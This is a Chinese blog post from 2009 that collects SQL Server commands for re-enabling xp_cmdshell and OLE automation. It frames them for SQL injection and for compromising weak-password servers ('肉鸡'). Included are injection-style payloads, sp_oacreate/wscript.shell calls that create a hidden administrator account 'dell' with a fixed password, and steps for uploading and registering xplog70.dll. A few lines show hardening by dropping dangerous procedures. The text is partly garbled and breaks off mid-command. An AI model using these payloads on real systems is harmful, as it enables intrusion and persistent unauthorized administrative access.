---
title: "恢复xp_cmdshell SQL Server阻止了对组件 'xp_cmdshell' 的过程'sys.xp_cmdshell' 启用"
date: 2009-11-16 13:52:00
categories: NeedIsMe
tags: ["Network Security", "Shell", "SQL", "网络安全"]
---

<p>SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell'<br />
的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用<br />
'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的<br />
"外围应用配置器"。</p>
<p>SQL2005 在默认的设置中是删除了 XP_CMDSHELL的，因此也在注射过程中产生了点困难。后来经过查看MSSQL2005的手册才知道情况原来如此：<br />
用下面一句话就可以了解决了。<br />
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC<br />
sp_configure 'xp_cmdshell', 1;RECONFIGURE;--<br />
关闭一样.只是将上面的后面的那个"1"改成"0"就可以了.<br />
;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC<br />
sp_configure 'xp_cmdshell', 0;RECONFIGURE;--</p>
<p>如果cmdshell还不行的话，就再运行：<br />
;dbcc addextendedproc("xp_cmdshell","xplog70.dll");--<br />
或者<br />
;sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'<br />
来恢复cmdshell。</p>
<p>盐城网络公司</p>
<p>1433SQL入侵恢复xp_cmdshell方法总结</p>
<p>sql server 2005下开启xp_cmdshell的办法</p>
<p>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC<br />
sp_configure 'xp_cmdshell', 1;RECONFIGURE;</p>
<p>SQL2005开启'OPENROWSET'支持的方法：</p>
<p>exec sp_configure 'show advanced options', 1;RECONFIGURE;exec<br />
sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;</p>
<p>SQL2005开启'sp_oacreate'支持的方法:</p>
<p>exec sp_configure 'show advanced options', 1;RECONFIGURE;exec<br />
sp_configure 'Ole Automation Procedures',1;RECONFIGURE;</p>
<p>突破SA的各种困难<br />
常见情况恢复执行xp_cmdshell<br />
1 未能找到存储过程'master..xpcmdshell'.<br />
恢复方法：查询分离器连接后,<br />
第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int<br />
第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'<br />
然后按F5键命令执行完毕</p>
<p>2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）<br />
恢复方法：查询分离器连接后,<br />
第一步执行：sp_dropextendedproc "xp_cmdshell"<br />
第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'<br />
然后按F5键命令执行完毕</p>
<p>3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)<br />
恢复方法：查询分离器连接后,<br />
第一步执行:exec sp_dropextendedproc 'xp_cmdshell'<br />
第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'<br />
然后按F5键命令执行完毕<br />
四.终极方法.<br />
如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:<br />
查询分离器连接后,<br />
2000servser系统:</p>
<p>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec<br />
sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user<br />
dell huxifeng007 /add'</p>
<p>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec<br />
sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net<br />
localgroup administrators dell /add'</p>
<p>xp或2003server系统:</p>
<p>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec<br />
sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user<br />
dell huxifeng007 /add'</p>
<p>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec<br />
sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net<br />
localgroup administrators dell /add'</p>
<p>--------------<br />
xp_cmdshell新的恢复办法<br />
删除</p>
<p>drop procedure sp_addextendedproc<br />
drop procedure sp_oacreate<br />
exec sp_dropextendedproc 'xp_cmdshell'</p>
<p>恢复</p>
<p>dbcc addextendedproc ("sp_oacreate","odsole70.dll")<br />
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")</p>
<p>这样可以直接恢复，不用去管sp_addextendedproc是不是存在</p>
<p>-----------------------------</p>
<p>删除扩展存储过过程xp_cmdshell的语句:</p>
<p>exec sp_dropextendedproc 'xp_cmdshell'</p>
<p>恢复cmdshell的sql语句</p>
<p>exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'</p>
<p>开启cmdshell的sql语句</p>
<p>exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'</p>
<p>判断存储扩展是否存在</p>
<p>select count(*) from master.dbo.sysobjects where xtype='x' and<br />
name='xp_cmdshell'</p>
<p>返回结果为1就ok</p>
<p>恢复xp_cmdshell</p>
<p>exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select<br />
count(*) from master.dbo.sysobjects where xtype='x' and<br />
name='xp_cmdshell'</p>
<p>返回结果为1就ok</p>
<p>否则上传xplog7.0.dll</p>
<p>exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll'</p>
<p>堵上cmdshell的sql语句</p>
<p>sp_dropextendedproc "xp_cmdshell</p>
<p>----------------<br />
删除sql危险存储：</p>
<p>DROP PROCEDURE sp_makewebtask<br />
exec master..sp_dropextendedproc xp_cmdshell<br />
exec master..sp_dropextendedproc xp_dirtree<br />
exec master..sp_dropextendedproc xp_fileexist<br />
exec master..sp_dropextendedproc xp_terminate_process<br />
exec master..sp_dropextendedproc sp_oamethod<br />
exec master..sp_dropextendedproc sp_oacreate<br />
exec master..sp_dropextendedproc xp_regaddmultistring<br />
exec master..sp_dropextendedproc xp_regdeletekey<br />
exec master..sp_dropextendedproc xp_regdeletevalue<br />
exec master..sp_dropextendedproc xp_regenumkeys<br />
exec master..sp_dropextendedproc xp_regenumvalues<br />
exec master..sp_dropextendedproc sp_add_job<br />
exec master..sp_dropextendedproc sp_addtask<br />
exec master..sp_dropextendedproc xp_regread<br />
exec master..sp_dropextendedproc xp_regwrite<br />
exec master..sp_dropextendedproc xp_readwebtask<br />
exec master..sp_dropextendedproc xp_makewebtask<br />
exec master..sp_dropextendedproc xp_regremovemultistring<br />
exec master..sp_dropextendedproc sp_OACreate<br />
DROP PROCEDURE sp_addextendedproc</p>
<p>--不狐 附上恢复扩展存储过程的办法</p>
<p>先恢复sp_addextendedproc，语句如下：</p>
<p>SQL代码：</p>
<p>create procedure sp_addextendedproc --- 1996/08/30 20:13<br />
@functname nvarchar(517),-- (owner.)name of function to call */<br />
@dllname varchar(255)-- name of DLL containing function */ as<br />
set implicit_transactions off<br />
if @@trancount > 0<br />
begin<br />
raiserror(15002,-1,-1,'sp_addextendedproc')<br />
return (1)<br />
end<br />
dbcc addextendedproc( @functname, @dllname)<br />
return (0) -- sp_addextendedproc<br />
GO</p>
<p>再恢复以上所有扩展存储过程</p>
<p>SQL代码：</p>
<p>use master<br />
exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'<br />
exec sp_addextendedproc xp_dirtree,'xpstar.dll'<br />
exec sp_addextendedproc xp_enumgroups,'xplog70.dll'<br />
exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'<br />
exec sp_addextendedproc xp_loginconfig,'xplog70.dll'<br />
exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'<br />
exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'<br />
exec sp_addextendedproc sp_OACreate,'odsole70.dll'<br />
exec sp_addextendedproc sp_OADestroy,'odsole70.dll'<br />
exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'<br />
exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'<br />
exec sp_addextendedproc sp_OAMethod,'odsole70.dll'<br />
exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'<br />
exec sp_addextendedproc sp_OAStop,'odsole70.dll'<br />
exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'<br />
exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'<br />
exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'<br />
exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'<br />
r>exec sp_addextendedproc xp_regread,'xpstar.dll'<br />
exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'<br />
exec sp_addextendedproc xp_regwrite,'xpstar.dll'<br />
exec sp_addextendedproc xp_availablemedia,'xpstar.dll'</p>
<p>SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell'<br />
的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用<br />
'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的<br />
"外围应用配置器"。</p>
<p>经常扫SQL弱口令肉鸡的朋友应该遇见过这样的问题 ！<br />
接下来我们用SQL语句搞定他</p>
<p>分析器执行的语句：</p>
<p>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp</p>

---

[📚 返回目录](/needisme-mu-lu/)
